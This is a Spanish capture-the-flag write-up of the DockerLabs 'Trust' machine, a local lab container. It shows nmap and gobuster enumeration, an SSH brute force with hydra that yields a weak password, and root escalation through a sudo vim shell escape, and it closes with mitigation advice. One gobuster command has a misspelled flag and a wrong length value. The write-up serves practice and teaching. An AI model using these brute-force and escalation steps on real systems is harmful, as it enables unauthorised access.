# Writeup: Trust

- **Máquina:** Trust (DockerLabs)
- **Enlace:** https://dockerlabs.es/maquinas/13/descargar
- **Dificultad:** Muy Fácil
- **Fecha:** 23 de Octubre 2026

---

## Objetivo
Practicar enumeración web, fuerza bruta con `hydra` y escalada de privilegios abusando de sudoers.

---

## Despliegue de la máquina
```bash
$ sudo bash auto_deploy.sh trust.tar
```
<img width="710" height="344" alt="Captura de pantalla (259)" src="https://github.com/user-attachments/assets/e9d7c9a2-a885-4874-b1fc-451e38985d34" />

---

## 1. Reconocimiento
Se realizó escaneo de puertos abiertos con `nmap`:

```bash
$ sudo nmap -p-  172.17.0.2
```

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh    
80/tcp open  http   
```
--- 

## 2. Identificación de vulnerabilidades
Dado que el objetivo del laboratorio es usar enumeración web, se utilizó la herramienta `gobuster` para identificar directorios o subdominios en la dirección IP victima.


---
## 3. Explotación
### 1. Enumeración web
Se ejecutó el siguiente comando para encontrar directorios o archivos ocultos en el servidor web:
```bash
$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/big.txt -x html,php,txt
```
<img width="1366" height="102" alt="Captura de pantalla (260)" src="https://github.com/user-attachments/assets/7f435e0d-fb91-4638-bfca-5c57d1938297" />
<br>

Al lanzar el scan, el servidor devolvió `200 OK` con un tamaño constante de **10701** para todas las rutas aleatorias, incluso si dichas rutas no existen y para evitar que la consola se inunde de falsos positivos, gobuster detuvo el scan.
Para superar este problema, se optó por utilizar `--exclude-length` en el comando `gobuster` para ignorar todas las respuestas de tamaño **10701**.
<br>

```bash
$ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/big.txt -x html,php,txt --exlude-length 107001
```

<img width="617" height="132" alt="Captura de pantalla (261)" src="https://github.com/user-attachments/assets/dd5a2309-1c97-4fbd-ad09-ee63bf3d7c20" />

Una vez obtenido el secreto, nos dirigimos a **http://172.17.0.2/secret.php** en el navegador, donde aparece el siguiente mensaje revelando la existencia de un usuario: **Mario**.
<img width="970" height="398" alt="Captura de pantalla (262)" src="https://github.com/user-attachments/assets/4075a569-8908-4251-a236-e28f26fc79af" />



### 2. Ataque a usuario Mario
Para hacerse con las credenciales de **Mario** se utilizó `hydra`:

```bash
$ hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
```
```bash
attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
```
Sabiendo la contraseña, se procede a conectarse como **Mario** mediante `ssh`: 
```bash
$ ssh mario@172.17.0.2   
```

<img width="509" height="89" alt="Captura de pantalla (263)" src="https://github.com/user-attachments/assets/830ec13f-c481-4cec-8578-bcfe4cfa035b" />



### 3. Escalada de privilegios 
Si usamos `sudo -l`, podemos ver que **Mario** tiene permisos para ejecutar `vim` como `root`. 
```bash
User mario may run the following commands on 24e330db163e:
    (ALL) /usr/bin/vim
```
Ejecutamos `sudo vim -c ':!/bin/bash'` para acceder a los privilegios `root`.
```bash
root@24e330db163e:/home/mario# whoami
root
```

---
## Acciones de mitigación
- **Escalada de privilegios mediante `vim`**: Aplicar principio de menor privilegio o retirar `vim` de sudoers.
- **Contraseña débil vulnerabe a ataques de fuerza bruta**: Aplicar políticas de contraseñas más seguras e implementar verificación en dos pasos (MFA).
- **Comentario oculto que advierte la existencia de un usuario**: Limpieza del código y evitar almacenar credenciales o información sensible en texto plano.
---
## Conclusión
Trust es una máquina que permite aprender sobre la enumeración web mediante `gobuster` y escalada de privilegios en Linux. 
